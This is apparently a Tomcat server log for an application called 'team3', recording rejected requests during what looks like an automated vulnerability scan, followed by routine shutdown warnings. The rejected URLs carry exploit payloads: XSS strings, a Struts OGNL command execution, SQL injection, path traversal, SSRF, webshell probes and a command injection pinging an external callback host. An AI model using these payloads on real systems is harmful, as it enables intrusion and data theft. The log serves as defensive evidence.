+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/Uploads/2R44zmFoR3N4A4Ok4C1jLYCfkWg.php?cmd=echo+"roxyfileman"+|+rev ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:45.226 INFO [http-nio-8082-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/index.php?SQ=0&attach=0&author=x"+onmouseover%3Dalert%28document.domain%29+x%3D&btn_submit=Search&field=all&forum_limiter&search_logic=AND&sort_order=REL&srch=2R450RoeSn7V2GvmCM0mPK4zQaL&t=search ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:46.161 INFO [http-nio-8082-exec-22] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [/n/n/n/n/n/n/n/n...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:47.527 INFO [http-nio-8082-exec-3] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:789488/?1.png ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:48.088 INFO [http-nio-8082-exec-16] org.apache.tomcat.util.http.parser.Cookie.logInvalidHeader A cookie header was received [() { ignored;] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+11-Jun-2023 22:11:48.098 INFO [http-nio-8082-exec-27] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:50.030 INFO [http-nio-8082-exec-12] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/menu/guiw?id=3&nsbrand=1&nsvpx=phpinfo&protocol=nonexistent.1337"> ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:51.102 INFO [http-nio-8082-exec-26] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&gallery_current_index=<script>alert(document.domain)</script>&limit=1&start=0 ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:51.123 INFO [http-nio-8082-exec-16] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xfa0x010x000x000xf60x030x030xc50xcb0x8a0xa20xbcz0xeauS0xc2{J0x86f0xb90xfd0x80H0xd60x91Y0xc00xe20xffc0xacA0xe2)0xc60xc82 ]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:52.953 INFO [http-nio-8082-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/cgi-bin/admin.cgi?Cmd=ping${IFS}-c${IFS}1${IFS}ci2u8beh06lga656vh80r5fo47bmkcbyx.oast.live&Command=sysCommand ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:54.905 INFO [http-nio-8082-exec-34] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(999999999)))),@`%27` ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:54.972 INFO [http-nio-8082-exec-15] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/fosagent/repl/download-snapshot?name=..\..\..\..\..\..\..\Windows\win.ini ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:11:56.895 INFO [http-nio-8082-exec-29] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/userportal/Controller?datagrid=179&json={"%f0%9f%a6%9e":"test"}&mode=8700&operation=1 ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:01.050 INFO [http-nio-8082-exec-41] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/Uploads/2R44zfYSVe1swmjj5SCjcrZm9zm.php7?cmd=echo+"roxyfileman"+|+rev ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:01.969 INFO [http-nio-8082-exec-41] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x000x000x00420x000x010x010x010x010x010x010x000x010x000x010x000x010x000x010x010x00 ]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:03.928 INFO [http-nio-8082-exec-14] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [SIP/2.00x0d0x0aVia: ]
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:558)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:09.915 INFO [http-nio-8082-exec-1] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:10.934 INFO [http-nio-8082-exec-9] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/?errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&page_id=0 ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:12.010 INFO [http-nio-8082-exec-30] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000x9e0x010x000x000x9a0x030x010xe80x1b0xcf0xac0x1fI0x04Q0x1d0x8c0x810x93!0xf50x9c0x180xea0x0c0x980xf00xbf0x1300xd20xc7>0xb0C10xf2:a0x000x00:0x000x140x000x030x000x040x000x120x000x190xc00x090x000x110x000x060x000x130x000x160xc00x130xc00x110x00/0xc00x0a0xc00x140xc00x120x000x150x000x080x0030x0050x0080xc00x080x000x0a0x00f0xc00x070x0020x000x050x000x170x0090x010x000x0070x000x000x000x130x000x110x000x000x0e192.168.47.1420x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000xff0x010x000x010x00...]. HTTP method names must be tokens
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:12:18.914 INFO [http-nio-8082-exec-29] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/team3/control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E ]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:482)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
+		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:829)
+11-Jun-2023 22:31:41.294 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+11-Jun-2023 22:31:41.295 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 22:31:41.296 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+11-Jun-2023 22:31:41.324 WARNING [main] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesJdbc The web application [team3] registered the JDBC driver [com.microsoft.sqlserver.jdbc.SQLServerDriver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+11-Jun-2023 22:31:41.327 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [9176c7da-8f0f-4b2a-91fe-8905795e53a3-34]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.327 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [e0863913-6fc9-447f-9400-0eb68ce8ca5a-24]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.328 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [a689070e-1d8c-4783-8a55-a431f76aadc6-22]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.328 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [eef87bea-5471-4857-91f5-08bba4ff3441-28]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.328 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [a8e88c21-f9a6-4191-8f1a-fd1901fd6b88-30]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 22:31:41.329 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@561b7d53]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [a098edaf-ba5a-4eea-adc4-894f13d718e7-28]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
